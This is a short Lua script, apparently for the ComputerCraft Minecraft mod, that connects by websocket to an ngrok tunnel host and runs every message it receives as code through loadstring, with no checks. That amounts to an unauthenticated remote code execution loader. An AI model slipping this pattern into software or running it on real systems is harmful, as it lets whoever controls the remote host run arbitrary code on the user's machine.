local ws,err = http.websocket("ws://75f3-186-193-243-109.ngrok.io")
if ws then
    while true do
        local msg = ws.receive()
        --print(msg)
        loadstring(msg)()
    end
else
    printError(err)
end
